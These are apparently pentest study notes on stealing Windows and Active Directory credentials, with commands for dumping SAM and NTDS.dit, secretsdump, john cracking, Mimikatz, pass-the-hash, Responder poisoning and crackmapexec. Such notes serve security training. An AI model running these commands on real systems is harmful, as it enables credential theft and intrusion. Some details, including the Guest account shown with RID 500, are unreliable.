SAM File (Security Account Manager)
It is located under %SystemRoot%/system32/config/SAM
It contains local accounts for Windows systems
Once you obtain SAM and SYSTEM file, then you can launch attacks against password hashes such as brute force, rainbow table etc.
It can be copied through Shadow or Registry Copy
SAM file is encrypted by default
reg save HKLM\SAM ./SAM
reg save HKLM\SYSTEM ./SYSTEM
secretsdump.py -sam <SAM_Name> -system <SYSTEM_Name> -hashes lmhash:nthash LOCAL -outputfile <filename>
  Administrator:500:<LM_HASH>:<NTLM_HASH>:::
  Guest:500:<LM_HASH>:<NTLM_HASH>:::

LM Hashes
LM Hashes were used in earlier systems. These are not used actively anymore. For LM Hash value, current systems put NULL value.
It was active, by default, before Windows Vista/2008
If password contains any letter, the letter is turned into Capital letter. Therefore, it is not case-sensitive.
A password can consist of maximum 14 letters. If password is less than 14, it is padded with NULL.
Password is broken into 2 parts, each with 7 characters. Each part is encrypted with DES. Eventually, we obtain 2 hashes with 8 bytes.
These hashes are concatenated;thus, 16 bytes hash is created.
No salting operation.
Brute force attack, rainbow table attacks can be performed.
john --format=lm <hash_value> --wordlist <wordlist_path>

NTLM Hashes
Actively used in modern systems.
It is case-sensitive.
MD4 is used.
Without recovering password, pass the hash can be applied.
No salting.
john --format=nt <hash_value> --wordlist <wordlist_path>

NTDS.dit
It is the database of Active Directory.
It is located under %SystemRoot%\Windows\NTDS
Favorite file of any attacker.
It can be copied through Shadow copy
  vssadmin create shadow /for=C:
  vssadmin list shadows
  copy <shadow>\Windows\ntds\ntds.dit ./ntds.dit
  copy <shadow>\Windows\system32\config\system ./system
  vssadmin delete shadow /for=C:
  secretsdump.py -ntds <ntds.dit> -system <SYSTEM_Name> -hashes lmhash:nthash LOCAL -outputfile <filename>
NTDS.dit file is encrypted by default.

Pass The Hash
By using hashes gathered during initial exploitation, we can move laterally on the network by performing Pass The Hash attack.
Metasploit -> exploit/windows/smb/psexec

Mimikatz
It is used to dump cleartext password, Kerberos ticket, etc from Windows system memory.
Once you have a meterpreter shell, you can load mimikatz
load mimikatz
load kiwi
-> mimikatz_command -f sekurlsa::logonPasswords
-> mimikatz_command -f sekurlsa::searchPasswords
-> creds_all
Mitigation : Windows Defender Credential Guard

Windows Authentication
Basically, Kerberos and NTLM Challange & Response authentication mechanisms are used in Windows environment.

NTLM C & R
LM - NTLM not equal to NTLMv1 - NTLMv2 - NetNTLM
You cannot perform pass the hash with NetNTLM, but you can relay

LLMNR & NetBIOS-NS Poisoining
LLMNR (Link Local Multicast Name Resolution) is used in LAN in order to resolve IP-hostname. Once you get no result with DNS, LLMNR is used.
LLMNR works on TCP/UDP  5355
NetBIOS (Network Basic Input/Output Service) is an API used to communicate among systems in LAN. NetBIOS-NS (Name Service) is used to resolve names. TCP/UDP Port No 137

Resolving steps in Windows systems
1) Local DNS Cache
2) Hosts file
3) DNS
4) LLMNR
5) NetBIOS-NS

LLMNR and NetBIOS-NS packets are broadcasted. The first system that responds to can capture the NetNTLM hash of the target user.
This NetNTLM C & R hash cannot pass the hash.
Can be performed cracking or smb relay.
Responder is used to perform LLMNR and NetBIOS poisoining.
responder -I <interface>
john <hash_file> --format=netntlmv2 --wordlist=<wordlist>


Domain Reconnaissance
Net users & net users /domain
Net user <username>
Net localgroup
Net localgroup <groupname>
Echo %userdomain%
Net group "Domain Admins" /domain
Net accounts /domain
Nltest /domain_trusts

BloodHound
It is used to visualize AD database.

SYSVOL
SYSVOL is a folder which resides on each and every domain controller within the domain. It contains the domains public files that need to be accessed by clients 
and kept synchronised between domain controllers. The default location for the SYSVOL is C:\Windows\SYSVOL although it can be moved to another location during the 
promotion of a domain controller. Itâ€™s possible but not recommended to relocate the SYSVOL after DC promotion as there is potential for error. The SYSVOL folder can 
be accessed through its share \\domainname.com\sysvol or the local share name on the server \\servername\sysvol.
groups.xml, scheduledtasks.xml, services.xml can contain sensitive information such as credential

smbclient \\\\<IP>\\<directory> -U 'domain\user'
smbclient \\\\<IP> -U 'domain\user'

SMB Shares
During penetration test, SMB shares are one of the greatest way to gather information about target.
There can be files that might contain sensitive information.
There can be NULL SESSION situations.
NULL SESSION : crackmapexec -u '' -p '' --shares <CIDR>

Crackmapexec
crackmapexec <CIDR> -u <user> -p <password> -d <domain> --uac
crackmapexec <CIDR> -u <user> -p <password> --local-auth
crackmapexec <CIDR> -u <user> -H <LM:NT>
crackmapexec <CIDR> -u <user> -p <password> -d <domain> --users | --groups | --pass-pol
crackmapexec <CIDR> -u <user> -p <password> -d <domain> --ntds
